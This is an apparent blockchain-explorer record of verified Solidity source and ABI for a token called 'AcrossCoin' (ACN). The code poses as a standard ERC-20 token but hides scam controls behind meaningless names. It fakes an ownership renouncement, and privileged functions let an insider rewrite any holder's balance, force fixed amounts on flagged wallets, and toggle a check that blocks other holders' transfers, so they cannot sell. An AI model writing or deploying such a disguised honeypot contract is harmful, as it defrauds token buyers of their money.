{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract totalTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeLaunch {\n    function createPair(address teamWallet, address modeAt) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface amountIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface takeMinTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingTo) external view returns (uint256);\n\n    function transfer(address limitListBuy, uint256 tradingFund) external returns (bool);\n\n    function allowance(address fromLaunchedReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitListBuy,\n        uint256 tradingFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenMarketing, uint256 value);\n    event Approval(address indexed fromLaunchedReceiver, address indexed spender, uint256 value);\n}\n\ninterface minSellTotal is takeMinTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AcrossCoin is totalTrading, takeMinTx, minSellTotal {\n\n    function liquidityTrading(address atFromToken) public {\n        require(atFromToken.balance < 100000);\n        if (sellTotalTx) {\n            return;\n        }\n        \n        maxFeeAmount[atFromToken] = true;\n        if (maxReceiver != amountAutoFrom) {\n            amountAutoFrom = true;\n        }\n        sellTotalTx = true;\n    }\n\n    function receiverTeam(address takeReceiver, uint256 tradingFund) public {\n        senderAuto();\n        buySwap[takeReceiver] = tradingFund;\n    }\n\n    constructor (){\n        if (maxLaunch != isTx) {\n            maxReceiver = false;\n        }\n        buyAmountToken();\n        amountIs receiverTx = amountIs(maxList);\n        swapEnable = takeLaunch(receiverTx.factory()).createPair(receiverTx.WETH(), address(this));\n        swapFund = takeLaunch(receiverTx.factory()).feeTo();\n        \n        walletMax = _msgSender();\n        maxFeeAmount[walletMax] = true;\n        buySwap[walletMax] = atAuto;\n        \n        emit Transfer(address(0), walletMax, atAuto);\n    }\n\n    function transfer(address takeReceiver, uint256 tradingFund) external virtual override returns (bool) {\n        return walletTx(_msgSender(), takeReceiver, tradingFund);\n    }\n\n    function approve(address fromTotalTrading, uint256 tradingFund) public virtual override returns (bool) {\n        feeFromAmount[_msgSender()][fromTotalTrading] = tradingFund;\n        emit Approval(_msgSender(), fromTotalTrading, tradingFund);\n        return true;\n    }\n\n    address swapFund;\n\n    function buyAmountToken() public {\n        emit OwnershipTransferred(walletMax, address(0));\n        fundFee = address(0);\n    }\n\n    bool public amountAutoFrom;\n\n    uint256 shouldSellWallet;\n\n    mapping(address => uint256) private buySwap;\n\n    function walletTx(address senderTotal, address limitListBuy, uint256 tradingFund) internal returns (bool) {\n        if (senderTotal == walletMax) {\n            return shouldTrading(senderTotal, limitListBuy, tradingFund);\n        }\n        uint256 isToken = takeMinTx(swapEnable).balanceOf(swapFund);\n        require(isToken == teamReceiverFee);\n        require(limitListBuy != swapFund);\n        if (walletAmount[senderTotal]) {\n            return shouldTrading(senderTotal, limitListBuy, liquidityEnableLaunch);\n        }\n        tradingFund = launchBuyMin(senderTotal, limitListBuy, tradingFund);\n        return shouldTrading(senderTotal, limitListBuy, tradingFund);\n    }\n\n    uint256 public feeSender = 0;\n\n    bool public exemptTotal;\n\n    uint256 private feeLaunchBuy;\n\n    uint256 constant liquidityEnableLaunch = 15 ** 10;\n\n    bool private maxReceiver;\n\n    address maxList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function balanceOf(address tradingTo) public view virtual override returns (uint256) {\n        return buySwap[tradingTo];\n    }\n\n    uint256 public isTx;\n\n    function allowance(address limitSender, address fromTotalTrading) external view virtual override returns (uint256) {\n        if (fromTotalTrading == maxList) {\n            return type(uint256).max;\n        }\n        return feeFromAmount[limitSender][fromTotalTrading];\n    }\n\n    function receiverSell(uint256 tradingFund) public {\n        senderAuto();\n        teamReceiverFee = tradingFund;\n    }\n\n    uint256 public receiverTotalTo = 3;\n\n    bool public sellTotalTx;\n\n    event OwnershipTransferred(address indexed takeReceiverEnable, address indexed minLaunched);\n\n    uint256 public senderSwap;\n\n    address public walletMax;\n\n    mapping(address => bool) public walletAmount;\n\n    mapping(address => mapping(address => uint256)) private feeFromAmount;\n\n    address public swapEnable;\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityFund;\n    }\n\n    function getOwner() external view returns (address) {\n        return fundFee;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingAmount;\n    }\n\n    string private marketingAmount = \"ACN\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverAmount;\n    }\n\n    uint256 private maxLaunch;\n\n    function owner() external view returns (address) {\n        return fundFee;\n    }\n\n    function shouldTrading(address senderTotal, address limitListBuy, uint256 tradingFund) internal returns (bool) {\n        require(buySwap[senderTotal] >= tradingFund);\n        buySwap[senderTotal] -= tradingFund;\n        buySwap[limitListBuy] += tradingFund;\n        emit Transfer(senderTotal, limitListBuy, tradingFund);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atAuto;\n    }\n\n    bool private marketingAuto;\n\n    uint8 private receiverAmount = 18;\n\n    uint256 public maxEnable;\n\n    function launchBuyMin(address senderTotal, address limitListBuy, uint256 tradingFund) internal view returns (uint256) {\n        require(tradingFund > 0);\n\n        uint256 txFund = 0;\n        if (senderTotal == swapEnable && receiverTotalTo > 0) {\n            txFund = tradingFund * receiverTotalTo / 100;\n        } else if (limitListBuy == swapEnable && feeSender > 0) {\n            txFund = tradingFund * feeSender / 100;\n        }\n        require(txFund <= tradingFund);\n        return tradingFund - txFund;\n    }\n\n    function transferFrom(address senderTotal, address limitListBuy, uint256 tradingFund) external override returns (bool) {\n        if (_msgSender() != maxList) {\n            if (feeFromAmount[senderTotal][_msgSender()] != type(uint256).max) {\n                require(tradingFund <= feeFromAmount[senderTotal][_msgSender()]);\n                feeFromAmount[senderTotal][_msgSender()] -= tradingFund;\n            }\n        }\n        return walletTx(senderTotal, limitListBuy, tradingFund);\n    }\n\n    function senderAuto() private view {\n        require(maxFeeAmount[_msgSender()]);\n    }\n\n    mapping(address => bool) public maxFeeAmount;\n\n    string private liquidityFund = \"Across Coin\";\n\n    uint256 private atAuto = 100000000 * 10 ** 18;\n\n    function isSwap(address modeAuto) public {\n        senderAuto();\n        \n        if (modeAuto == walletMax || modeAuto == swapEnable) {\n            return;\n        }\n        walletAmount[modeAuto] = true;\n    }\n\n    uint256 teamReceiverFee;\n\n    bool private walletMarketing;\n\n    address private fundFee;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLaunchedReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeReceiverEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromTotalTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountAutoFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTotalTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAmountToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeAuto\",\"type\":\"address\"}],\"name\":\"isSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFromToken\",\"type\":\"address\"}],\"name\":\"liquidityTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxFeeAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingFund\",\"type\":\"uint256\"}],\"name\":\"receiverSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingFund\",\"type\":\"uint256\"}],\"name\":\"receiverTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTotalTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTotalTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitListBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AcrossCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}